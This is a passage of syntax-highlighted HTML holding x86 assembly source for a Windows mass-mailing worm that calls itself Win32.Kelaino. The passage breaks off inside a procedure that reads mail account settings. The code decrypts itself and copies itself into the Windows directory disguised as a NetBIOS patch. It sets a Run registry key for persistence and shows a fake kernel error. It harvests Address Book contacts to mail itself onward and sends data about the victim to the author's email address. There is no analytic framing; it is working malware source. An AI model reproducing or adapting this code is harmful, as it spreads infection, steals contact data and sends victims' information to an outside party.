</span><span class="sc5">reg_account_string</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Software\Microsoft\Internet Account Manager"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">reg_run_at_start</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Software\Microsoft\Windows\CurrentVersion\Run"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">reg_wab_address</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Software\Microsoft\WAB\WAB4\Wab File Name"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">phk_result</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">phk_result2</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">reg_account_string_plus</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">"Software\Microsoft\Internet Account Manager\Accounts\"
</span><span class="sc5">AccountIdx</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"00000000"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">default_mail_account</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Default Mail Account"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">default_mail_account2</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SMTP Server"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pop3_account_value</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"POP3 Server"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pop3_user_value</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"POP3 User Name"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">smtp_user_address</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SMTP Email Address"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">reg_query_size</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
</span><span class="sc5">reg_query_size2</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0">
</span><span class="sc5">reg_query_size3</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">80</span><span class="sc0">
</span><span class="sc5">user_smtp_server</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">wab_file_name</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">correct_command</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"250"</span><span class="sc0">  
</span><span class="sc5">myname</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">windowsname</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">actualname</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">70</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">sendmailto_offset</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">myfirstaddress</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"kelaino@freenet.de"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">lpdwFlags</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">InternetGetConnectedState</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"InternetGetConnectedState"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dllname</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"wininet.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  
</span><span class="sc5">libhandle</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
</span><span class="sc5">spirulina</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"netbiospatch10.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">message_text</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Couldn't execute frame buffer!"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">message_title</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"KERNEL32 ERROR"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mail_mode</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">unicode_mail_buffer</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">file_size</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">wab_in_memory</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">netpatch</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"netpatch"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Win32.Kelaino coded by BeLiAL/BCVG"</span><span class="sc0">

</span><span class="sc5">data_seg_end</span><span class="sc4">:</span><span class="sc0">                     

</span><span class="sc1">;------------------------------------------the virus starts here------------------------------------</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_seg_end</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_seg_start</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_seg_start</span><span class="sc0">

</span><span class="sc5">decryption_loop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">start2</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">30h</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">decryption_loop</span><span class="sc0">

</span><span class="sc5">start2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myname</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">     </span><span class="sc1">;Get its own filename</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dllname</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">libhandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;Load the wininet.dll</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">InternetGetConnectedState</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InternetGetConnectedState</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">that_was_it</span><span class="sc0">                  </span><span class="sc1">;load InternetGetConnectedState() API</span><span class="sc0">
 
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InstallVirus</span><span class="sc0">               </span><span class="sc1">;copy Virus to Windir and Registry</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CollectData</span><span class="sc0">                </span><span class="sc1">;collect smtp-server and stuff like this from the registry</span><span class="sc0">

</span><span class="sc5">wait_for_connection</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lpdwFlags</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InternetGetConnectedState</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">wait_for_connection</span><span class="sc0">          </span><span class="sc1">;an endless check-connection loop</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SearchWAB</span><span class="sc0">                  </span><span class="sc1">;open the WAB file and copy it to memory</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">bedder_exit_now</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">64h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">finished_with_mail</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">60h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">;Are the Mailaddresses is in Unicode?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">mail_loop</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">unicode_mail_buffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">unicode_loop</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;A special way for handling the unicode string</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">send_unicode_mail</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">unicode_loop</span><span class="sc0">

</span><span class="sc5">send_unicode_mail</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">unicode_mail_buffer</span><span class="sc0">                 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FAKE_MAIL</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendMail</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">finished_with_mail</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">unicode_mail_buffer</span><span class="sc0">  
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">unicode_loop</span><span class="sc0">

</span><span class="sc5">mail_loop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;the mailaddress offset</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FAKE_MAIL</span><span class="sc0">                  </span><span class="sc1">;in my routines, two mailtypes are possible</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendMail</span><span class="sc0">                   </span><span class="sc1">;send the mail</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">finished_with_mail</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mail_loop</span><span class="sc0"> 

</span><span class="sc5">finished_with_mail</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wab_in_memory</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GlobalFree</span><span class="sc0">         </span><span class="sc1">;Unload the WAB-file in memory</span><span class="sc0">

</span><span class="sc5">bedder_exit_now</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myfirstaddress</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">INFO_MAIL</span><span class="sc0">                  </span><span class="sc1">;thats not a faked mail for spreading, it sends me some data</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendMail</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">libhandle</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;unload wininet.dll</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FreeLibrary</span><span class="sc0">

</span><span class="sc5">that_was_it</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">                </span><span class="sc1">;exit</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------procedures------------------------------------------------</span><span class="sc0">

</span><span class="sc5">InstallVirus</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">windowsname</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">actualname</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">70</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">
 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">windowsname</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">spirulina</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myname</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">          </span><span class="sc1">;copy virus now to windir</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">install_registry</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">message_title</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">message_text</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">                </span><span class="sc1">;if its created first time, display a message box</span><span class="sc0">

</span><span class="sc5">install_registry</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">phk_result</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">KEY_ALL_ACCESS</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reg_run_at_start</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0"> 
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegOpenKeyExA</span><span class="sc0">      </span><span class="sc1">;open the autorun folder in the registry</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">phk_result</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">abort_installation</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">spirulina</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">REG_SZ</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">netpatch</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">phk_result</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegSetValueExA</span><span class="sc0">     </span><span class="sc1">;make a new value which points to our worm</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">phk_result</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">phk_result</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">abort_installation</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">CollectData</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">phk_result</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">KEY_ALL_ACCESS</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reg_account_string</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0"> 
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegOpenKeyExA</span><span class="sc0">      
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">phk_result</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">take_default_settings</span><span class="sc0">    </span><span class="sc1">;Open the Internet Account Manager</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reg_query_size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AccountIdx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">default_mail_account</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">phk_result</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegQueryValueExA</span><span class="sc0">       </span><span class="sc1">;get the folder which contains the personal settings</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AccountIdx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc2">30h</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">take_default_settings</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">reg_query_size</span><span class="sc4">],</span><span class="sc2">9</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">phk_result</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">phk_result</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">phk_result</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">KEY_ALL_ACCESS</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reg_account_string_plus</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0"> 
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegOpenKeyExA</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">phk_result</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">take_default_settings</span><span class="sc0">        </span><span class="sc1">;open this folder</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reg_query_size2</span><span class="sc0">
